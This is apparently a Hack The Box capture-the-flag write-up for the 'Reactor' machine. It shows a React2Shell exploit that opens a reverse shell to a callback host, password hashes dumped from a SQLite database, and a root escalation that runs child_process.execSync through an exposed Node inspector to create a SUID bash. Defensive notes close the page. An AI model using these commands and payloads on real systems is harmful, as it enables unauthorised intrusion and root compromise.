---
title: Reactor
description: Reactor Hack The Box writeup covering React2Shell and a privileged Node inspector escalation.
---

# Reactor

<img class="htb-banner" src="images/banner.png" alt="Reactor box banner placeholder">

!!! note "Replaceable banner"
    Replace `images/banner.png` in this box folder with the final Reactor artwork. The page already points to that filename.

| Field | Value |
| --- | --- |
| Status | Completed — May 26, 2026 |
| Difficulty | Easy; assessed as Medium by the author |
| Focus | Linux, Node.js, web exploitation |
| Machine | [Reactor on Hack The Box](https://app.hackthebox.com/machines/Reactor?sort_by=created_at&sort_type=desc) |

## Attack path

1. Scan the host and identify SSH and the Next.js service on port 3000.
2. Exploit the React2Shell vulnerability to obtain a shell as `node`.
3. Read the application SQLite database and use the recovered engineer credentials over SSH.
4. Discover a privileged Node process with the inspector bound to `127.0.0.1:9229`.
5. Connect to the inspector, execute JavaScript in the privileged process and create a SUID Bash copy.

## 1. Reconnaissance

The completed scan found SSH and the web application:

```bash
nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/nmap_full_scan <TARGET_IP>
```

| Port | Service | Observation |
| ---: | --- | --- |
| 22/tcp | SSH | Used later for the `engineer` account. |
| 3000/tcp | Next.js | React/Next.js application and the initial attack surface. |

The first two screenshots show the web reconnaissance sequence.

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-1.png" alt="Reactor web reconnaissance screenshot one" loading="lazy">
  <figcaption><strong>Figure 1.</strong> Initial reconnaissance of the Reactor application.</figcaption>
</figure>

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-2.png" alt="Reactor web reconnaissance screenshot two" loading="lazy">
  <figcaption><strong>Figure 2.</strong> The second reconnaissance view from the completed session.</figcaption>
</figure>

## 2. Exploit React2Shell

The source notes use a React2Shell proof of concept for CVE-2025-55182. Replace the target and callback values with the values from the active lab session:

```bash
python3 react2shell.py \
  -u http://<TARGET_IP>:3000/ \
  -l <LHOST> \
  -p 4444
```

The payload creates a FIFO-backed reverse shell. Catch the connection and stabilize it:

```bash
nc -lvnp 4444

python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
```

The resulting shell runs as `node` in `/opt/reactor-app`.

## 3. Recover the engineer account

The application directory contains `reactor.db`. Inspect its schema and user records with SQLite:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
SQLite version 3.45.1
sqlite> .tables
sensor_logs  users
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

The recovered engineer credentials allow SSH access:

```bash
ssh engineer@<TARGET_IP>
```

The user flag was read from the engineer home directory. The value is redacted in this public writeup:

```bash
engineer@reactor:~$ cat user.txt
<USER_FLAG_REDACTED>
```

The third supplied screenshot documents the credential-recovery portion of the completed route.

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-3.png" alt="Reactor credential recovery screenshot" loading="lazy">
  <figcaption><strong>Figure 3.</strong> The supplied credential-recovery screenshot used in the completed Reactor route.</figcaption>
</figure>

## 4. Find the Node inspector

From the engineer shell, inspect listening sockets:

```bash
engineer@reactor:/opt/uptime-monitor$ ss -tunlp
...
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*  users:(('node',pid=...,fd=...))
...
```

Port `9229` is the Node.js inspector. The source notes also show that starting another worker fails because the port is already in use and that the worker has permission problems writing its log. Those observations help distinguish the already-running inspector process from the low-privilege process you can start yourself.

## 5. Execute JavaScript through the inspector

Connect to the local inspector:

```bash
node inspect 127.0.0.1:9229
```

The inspector evaluates JavaScript in the context of the process that owns it. The completed exploit used `child_process.execSync` to copy Bash to `/tmp/r00t` and set the SUID bit:

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

Verify the resulting file and start a privileged Bash shell. The `-p` switch keeps Bash from dropping its elevated effective UID:

```bash
ls -la /tmp/r00t
/tmp/r00t -p

r00t-5.2# whoami
root

r00t-5.2# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

## Why the escalation works

A Node inspector is a full debugging interface, not a read-only status endpoint. Any local user who can connect to it can evaluate JavaScript in the target process. Binding the inspector to `127.0.0.1` limits network exposure but does not protect against another local account.

### Defensive notes

- Do not run `node --inspect` or `--inspect-brk` for privileged production services.
- Run debug interfaces as an unprivileged account and isolate them with namespaces or a local firewall.
- Monitor for unexpected SUID binaries in writable directories such as `/tmp`.
